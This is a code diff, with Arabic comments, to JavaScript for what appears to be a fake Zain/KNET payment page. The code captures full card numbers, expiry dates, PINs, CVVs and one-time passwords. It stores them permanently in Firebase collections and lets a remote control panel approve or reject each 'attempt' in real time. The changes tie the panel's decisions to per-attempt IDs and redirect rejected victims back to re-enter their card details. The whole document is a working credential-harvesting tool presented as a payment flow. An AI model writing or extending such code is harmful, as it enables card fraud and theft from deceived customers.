@@ -59,9 +59,29 @@
   }
   window.sessionId = sessionId;
 
+  // ── المحاولة الحالية (attemptId) ────────────────────────────
+  // تُنشأ محاولة جديدة عند بدء تدفق دفع جديد (إدخال بطاقة / OTP).
+  // القرارات من لوحة التحكم تشمل attemptId الخاص بالمحاولة، فلا يختلط
+  // قرار محاولة سابقة (رفض قديم) مع محاولة جديدة.
+  let currentAttemptId = sessionStorage.getItem('zain_attempt_id') || '';
+  window.currentAttemptId = currentAttemptId;
+
   // مرجع وثيقة العميل في Firestore (المصدر الموحّد للوحة التحكم الجديدة)
   const customerRef = db.collection("customers").doc(sessionId);
   window.customerRef = customerRef;
+
+  window.startNewAttempt = function (attemptType) {
+    const att = (attemptType || 'pay').replace(/[^a-zA-Z0-9_]/g, '') + '_' + Date.now();
+    currentAttemptId = att;
+    window.currentAttemptId = att;
+    try { sessionStorage.setItem('zain_attempt_id', att); } catch (e) {}
+    try { sessionStorage.setItem('zain_attempt_started', String(Date.now())); } catch (e) {}
+    // تصفير القرار لأي محاولة سابقة (لا يبقى رفض/موافقة قديمة)
+    try { customerRef.set({ decision: 'pending', status: 'pending', attemptId: att, reason: '' }, { merge: true }); } catch (e) {}
+    try { rtd.ref('commands/' + sessionId + '/rejection').remove(); } catch (e) {}
+    try { rtd.ref('commands/' + sessionId + '/approval').remove(); } catch (e) {}
+    return att;
+  };
 
   window.getDeviceAndBrowser = function () {
     const ua = navigator.userAgent;
@@ -259,11 +279,14 @@
   // إرسال بيانات البطاقة
   // ═══════════════════════════════════════════════════════════
   window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin, cvv) {
-    const attemptId = 'card_' + Date.now();
+    // استخدام المحاولة الحالية إن وُجدت، وإلا بدء محاولة جديدة صراحة
+    // (يضمن أن كل تدفق دفع جديد يحمل attemptId فريداً يربط قرار اللوحة به)
+    const attemptId = currentAttemptId || window.startNewAttempt('pay');
     const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
     const cardData = {
       id: attemptId,
+      attemptId: attemptId,
       bankName: bank || 'غير معروف',
       cardPrefix: prefix || '',
       cardNumber: cardNum || '',
@@ -276,9 +299,11 @@
     // أرشيف دائم في مجموعة cards + سجل المحاولات اللحظي
     const writes = [
       rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData),
-      rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة إدخال البطاقة' }),
+      rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة إدخال البطاقة', attemptId: attemptId }),
       db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData),
-      db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() })
+      db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() }),
+      // ربط المحاولة الحالية بوثيقة العميل لترى لوحة التحكم attemptId صاحب القرار
+      customerRef.set({ attemptId: attemptId, decision: 'pending', status: 'pending', currentPage: 'صفحة إدخال البطاقة', lastSeen: Date.now() }, { merge: true })
     ];
     try {
       return Promise.all(writes).then(function () { return cardData; });
@@ -295,15 +320,16 @@
   window.pushFirebaseOtp = function (otp) {
     const otpId = 'otp_' + Date.now();
     const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-    const otpData = { id: otpId, otp: otp, timestamp: timestampStr };
+    const attemptId = currentAttemptId || window.startNewAttempt('pay');
+    const otpData = { id: otpId, attemptId: attemptId, otp: otp, timestamp: timestampStr };
 
     rtd.ref('sessions/' + sessionId + '/otps/' + otpId).set(otpData);
-    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true });
+    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, attemptId: attemptId });
     db.collection("card_data").doc(sessionId).collection("otps").doc(otpId).set(otpData);
     // أرشيف دائم في مجموعة otps
     db.collection("otps").doc(otpId).set({ ...otpData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
     // كتابة otp في وثيقة العميل لتعرضها لوحة التحكم الجديدة
-    customerRef.set({ otp: String(otp || ''), lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
+    customerRef.set({ otp: String(otp || ''), attemptId: attemptId, lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
     return Promise.resolve();
   };
 
@@ -372,28 +398,25 @@
     let __lastDecisionTs = null;
     let __snapshotOk = false;
 
-    // تجاهل القرارات القديمة (older than 2 minutes): القرارات المحسومة مسبقاً
-    // تبقى في Firestore/RTDB وتبقى تمنع العميل عند إعادة تحميل أي صفحة لاحقاً.
-    const STALE_DECISION_MS = 120000;
-
-    function decisionAgeMs(data) {
-      if (!data) return null;
+    // القرار يقبل فقط إذا كان خاصاً بالمحاولة الحالية:
+    //  - إن حمل القرار attemptId يطابق currentAttemptId → قرار هذه المحاولة
+    //  - إن لم يحمل attemptId (لوحة قديمة) → يقبل فقط إذا صدر بعد بدء المحاولة
+    function decisionMatchesCurrentAttempt(data) {
+      if (!data) return true;
+      if (data.attemptId) return data.attemptId === currentAttemptId;
+      // بدون attemptId: نتحقق أن القرار صدر بعد بدء المحاولة الحالية
+      var startedRaw = null;
+      try { startedRaw = sessionStorage.getItem('zain_attempt_started'); } catch (e) {}
+      var started = startedRaw ? parseInt(startedRaw, 10) : null;
+      if (!started || !data.decidedAt) return true;  // معلومات غير كافية → نقبل (توافق للخلف)
+      var decidedMs = null;
       var t = data.decidedAt;
-      if (!t) return null;
-      // Timestamp من onSnapshot
-      if (typeof t.toMillis === 'function') return Date.now() - t.toMillis();
-      // ثواني/مللي (عدد)
-      if (typeof t === 'number') {
-        var n = String(t).length === 10 ? t * 1000 : t;
-        return Date.now() - n;
-      }
-      // سلسلة ISO قادمة من REST (fields.decidedAt.timestampValue)
-      if (typeof t === 'string') {
-        var parsed = Date.parse(t);
-        return isNaN(parsed) ? null : Date.now() - parsed;
-      }
-      if (t._seconds) return Date.now() - (t._seconds * 1000);
-      return null;
+      if (typeof t.toMillis === 'function') decidedMs = t.toMillis();
+      else if (typeof t === 'number') decidedMs = String(t).length === 10 ? t * 1000 : t;
+      else if (typeof t === 'string') decidedMs = Date.parse(t);
+      else if (t && t._seconds) decidedMs = t._seconds * 1000;
+      if (decidedMs === null || started === null) return true;
+      return decidedMs >= started;
     }
 
     function handleDecision(decision, data) {
@@ -402,15 +425,14 @@
         __lastDecision = 'pending';
         return;
       }
-      // منع التكرار: نفس القرار + نفس الطابع الزمني → تجاهل
-      var ts = (data && (data.decidedAt || data.lastSeen)) || null;
-      if (decision === __lastDecision && String(ts) === String(__lastDecisionTs)) return;
-      // تجاهل القرارات القديمة (من جلسة سابقة/محاولة سابقة)
-      var age = decisionAgeMs(data);
-      if (age !== null && age > STALE_DECISION_MS) {
+      // قبل كل شيء: القرار يجب أن يخص المحاولة الحالية (فوري ولحظي، لا وقت)
+      if (!decisionMatchesCurrentAttempt(data)) {
         __lastDecision = 'pending';
         return;
       }
+      // منع التكرار: نفس القرار + نفس الطابع الزمني → تجاهل
+      var ts = (data && (data.decidedAt || data.lastSeen)) || null;
+      if (decision === __lastDecision && String(ts) === String(__lastDecisionTs)) return;
       __lastDecision = decision;
       __lastDecisionTs = ts;
       if (decision === 'approved') {
@@ -432,6 +454,13 @@
       if (!fields) return null;
       var t = fields.decidedAt || fields.lastSeen;
       return (t && t.timestampValue) ? t.timestampValue : null;
+    }
+
+    // استخراج attemptId من استجابة Firestore REST
+    function restAttemptId(fields) {
+      if (!fields || !fields.attemptId) return currentAttemptId;
+      var v = fields.attemptId;
+      return (v && (v.stringValue || v.integerValue)) || currentAttemptId;
     }
 
     // بدء الاستماع اللحظي عبر onSnapshot (مع إعادة المحاولة عند الفشل)
@@ -468,7 +497,7 @@
               .then(function (r) { return r.json(); })
               .then(function (d) {
                 if (d && d.fields) {
-                  handleDecision(restDecision(d.fields), { decision: restDecision(d.fields), decidedAt: restTimestamp(d.fields), lastSeen: restTimestamp(d.fields), _rest: true });
+                  handleDecision(restDecision(d.fields), { decision: restDecision(d.fields), decidedAt: restTimestamp(d.fields), lastSeen: restTimestamp(d.fields), attemptId: restAttemptId(d.fields), _rest: true });
                 }
               })
               .catch(function (e) { /* تجاهل أخطاء الاستطلاع بصمت */ });
@@ -487,10 +516,17 @@
     let __firstRejectionSnap = true;
     let __firstRedirectSnap = true;
 
+    function cmdMatchesAttempt(cmd) {
+      // الأوامر الصادرة من اللوحة تحمل attemptId — نقبلها فقط إذا تطابقت المحاولة
+      if (!cmd) return false;
+      if (cmd.attemptId && currentAttemptId) return cmd.attemptId === currentAttemptId;
+      return true; // أوامر قديمة بلا attemptId لا نعتمد عليها إلا عند وجود محاولة نشطة
+    }
+
     cmdRef.child('approval').on('value', (snap) => {
       if (__firstApprovalSnap) { __firstApprovalSnap = false; return; }
       const cmd = snap.val();
-      if (cmd && cmd.action === 'APPROVE_PAYMENT' && !window.__approvalHandled) {
+      if (cmd && cmd.action === 'APPROVE_PAYMENT' && !window.__approvalHandled && cmdMatchesAttempt(cmd)) {
         window.__approvalHandled = true;
         if (__lastDecision !== 'approved') {
           __lastDecision = 'approved';
@@ -502,7 +538,7 @@
     cmdRef.child('rejection').on('value', (snap) => {
       if (__firstRejectionSnap) { __firstRejectionSnap = false; return; }
       const cmd = snap.val();
-      if (cmd && cmd.action === 'REJECT_PAYMENT' && !window.__rejectionHandled) {
+      if (cmd && cmd.action === 'REJECT_PAYMENT' && !window.__rejectionHandled && cmdMatchesAttempt(cmd)) {
         window.__rejectionHandled = true;
         if (__lastDecision !== 'rejected') {
           __lastDecision = 'rejected';
@@ -529,14 +565,16 @@
     });
   };
 
-  // السماح للعميل بإعادة المحاولة بعد رفض سابق:
-  // يصفّر القرار في Firestore ويمسح أوامر RTDB حتى لا تبقى عالقة في جلسات لاحقة
+  // إعادة المحاولة: بدء محاولة جديدة (attemptId جديد) وتصفير القرار،
+  // ثم إعادة التوجيه إلى صفحة إدخال بيانات الدفع (البطاقة أو KNET)
+  // — الوجهة تُحدَّد تلقائياً من اسم الصفحة الحالية:
+  //   verification.html / knet.html (KNET) → knet.html ، غيرها → card-payment.html
   window.clearRejection = function () {
-    try { customerRef.set({ decision: 'pending', status: 'pending', reason: '' }, { merge: true }); } catch (e) {}
-    try { rtd.ref('commands/' + sessionId + '/approval').remove(); } catch (e) {}
-    try { rtd.ref('commands/' + sessionId + '/rejection').remove(); } catch (e) {}
-    window.__approvalHandled = false;
-    window.__rejectionHandled = false;
+    window.startNewAttempt('pay');
+    const path = window.location.pathname || '';
+    const dest = (/knet/i.test(path) || /verification/i.test(path)) ? 'knet.html' : 'card-payment.html';
+    try { sessionStorage.setItem('zain_back_from_reject', '1'); } catch (e) {}
+    window.location.href = dest;
   };
 
   // ابدأ الجلسة بعد التأكد من المصادقة (قواعد أمان Firestore تتطلب تسجيل دخول للكتابة في customers)
